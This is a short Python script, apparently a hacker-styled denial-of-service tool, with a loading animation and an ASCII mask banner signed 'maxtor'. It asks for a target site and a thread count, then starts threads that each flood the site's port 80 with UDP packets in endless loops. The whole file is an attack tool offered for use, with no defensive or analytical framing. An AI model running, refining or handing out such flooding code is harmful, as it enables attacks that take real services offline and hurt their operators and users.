import time
import socket
import sys
import _thread
import os
from os import system
from time import sleep
#color set
os.system("")
class color:
    green = "\033[32m"
    red = "\033[31m"
    blue = "\033[36m"
    pink = "\033[35m"
    yellow = "\033[93m"
    darkblue = "\033[34m"
    white = "\033[00m"
    mark = '\x1b[38;5;4m'
    mark1 = '\x1b[48;5;15m'
    mark2 = '\x1b[0m'
#Theme
print(color.red+f"Loading",end='')
sleep(1)
print(color.yellow+f".",end='',flush=True)
sleep(1)
print(color.yellow+f".",end='',flush=True)
sleep(1)
print(color.yellow+f".",end='',flush=True)
sleep(1)
print(color.yellow+f".",end='',flush=True)
sleep(1)
print(color.yellow+f".",end='',flush=True)
sleep(1)
print(color.yellow+f".",end='',flush=True)
sleep(1)
print(color.yellow+f".",end='',flush=True)
sleep(1)
anonymous="""
                            .7KBQBBBBBBBBBIr
                        i5RQQP1ri..   ..i7IbQQM2i
                    rQBBDY.                   .JgBBMr
                 rBQB7                             vBBBi
               PBBr                                   vBQI
             ZBD.                                       .QBX
           IBg                                             BBv
          BB.                                               .BB
        vBY      qq.       ...:r::i.::i::i:..        :dI      XBi
       DB     :BBR      ..: .:.  :  : ..  ::....       BBB.    .B2
      BB   g:1BBi     .r:   .   ..  :  :.   .   :i.     7BQ7rd   Bb
     gB   BE.BIi:   .:. ..:i.   i   i   :   .i:.. .:.   i:PB BB   BI
    YB   BB :iIB   :.    ..  ..:: dd7BQ:.:..  ..    .:  .BJi. Qd   Bi
    B  B BQ QBB   i     .:     :  BR XBB .     :.     i   BBD BB.B :B
   BM PB BQBU:   :      i      i    :BM  i      i      i   iXBBB Bv BB
  .B  BB Qu P7  i....  :.     ..    X    :      ..  ....i  u1 qg BB  B
  BB  BB  rBB  i    ...i....  :.   .5    :. .....i...    :  BBi .BB  Bj
  B  BB DBZ  .:     ..   .i...# maxtor #...: .    :       :   BBI.BZ iB
 jQ Y: BQB..  :       :.      :           .      ..      .:   :BMB Y: B
 BB MB RB  B  i       :       .   rEXEi   .       :       :  B  BS B1 B
 BZ vB: : BP  i.......:        1B .QBd  Bv       .:.......:  BB r vB: B
 BM  BB  BB   i . . . :  .:rUZBBB  rB:  BBBE1i:.  : ... . i   BB .BB  B
 BB  KBgiBY   :        rBBBBBBQB.   Q   iBBBBBBBBi        :   KB:BBL  B
 vB L YBBB Qi :        BBBBQBBBB:  5B7  7BBBBBBBBZ       .: LK BQQi r B
  B rB  BR Bd  :       BQBQBQBBBQ  MQS  QBQBBBBBBB       :  BB BB  B.:B
  QQ BB. : QB  :    . :BBBBBBBBBB7 bBs 5BBBBBBBBBB. .   ..  BB i :BB BY
   B  BBB  BQ i :...  :BBBBBQBBBBB:KBJiBBBBBBBBBBB   ..:. r BB  BBQ  B
   BB  uBBiBB Bj .    PBBQBBBBBQBBBBBQBBBBBBBQBQBBJ    . dB BRrBB7  BQ
    B. 7 vBBQ rB: .   QBBBBBBBBBBBBBQBBBBBBBBBBBBBZ   . 7B..BBBr 7 7B
    7B iB.  K5 BB     BQBBBBBQBQBBBBBBBQBBBBBBBBBBB     BB D1  iB. Q:
     bQ .BBP:: YBd 5  BBQBBBBBBBQBQBBBQBBBBBQBBBBBB  X BBi ::gBB  BJ
      gB  rBBBBrZB.uB7BBBBBBBBBQBBBBBQBBBQBBBBBBBQBrBi:QqrBBBQ:  BI
       KB.  ivqBMBB 1BBBBBBBBBBBBBBBBBBBBBBBBBBBBBQB7 BBMBSvi  :BY
        rQ5 .u7:. :r .KQBBBBBBBBBQBQBBBBBBBBBBBQBQS  7: .:vJ  DB:
          QB  iBBBBBBBBBQKrQQBBBBBBBBBBBBBBBQZrPQBBBBBBBBQ: .BB
           7Bg   :i:..    iQBBBBBBBQBQBBBBBBBRi    ..:r.   BBi
             XBR  .2ZQBBBBBBQBBBBBBBBBBBBBBBQBBBBBBQE1. .BBu
               uBQi  .r7i  BBQBBBBBQBBBBBBBBBQ .rri.  rBBv
                 :gBgi     BQBBBBBBBQBBBBBBBBB     rMBZ.
                    idBBgrJBBBBBBBBBBBBBBBBBBB77QBBP:
                        .rv1XZMQQBBBBBBBQQgZSu7i 

"""
for i in anonymous:
    sleep(0.001)
    print(color.yellow+i,end='',flush=True)

site = input("Enter your site url => ")
thread_count = input("Enter your thread => ")
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'server-script'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print("Packet Sent")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass




system("clear")
time.sleep(2)
system("python start.py")
